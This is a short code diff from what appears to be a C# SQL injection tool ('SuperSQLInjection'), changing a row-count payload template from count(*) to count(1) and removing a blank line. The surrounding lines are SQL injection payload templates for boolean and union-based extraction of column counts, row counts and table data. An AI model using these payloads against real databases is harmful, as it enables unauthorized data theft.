@@ -48,7 +48,6 @@ namespace SuperSQLInjection.payload
         //获取列数量bool
         public static String bool_columns_count = " " + columns_count + ">{len}";
         
-
         //多字符长度判断
         //public static String mu_value = "(hex(convert((mid({data},{index},1)) using UTF8)))";
 
@@ -72,7 +71,7 @@ namespace SuperSQLInjection.payload
         public static String data_value_order = "(select {column} from (select {columns} from {dbname}.{table} offset {index} limit 1)tmp)";
 
         //union获取数据条数
-        public static String data_count = "(select count(*) from {dbname}.{table})";
+        public static String data_count = "(select count(1) from {dbname}.{table})";
         //bool判断数据条数
         public static String bool_datas_count = " " + data_count + ">={len}";
 
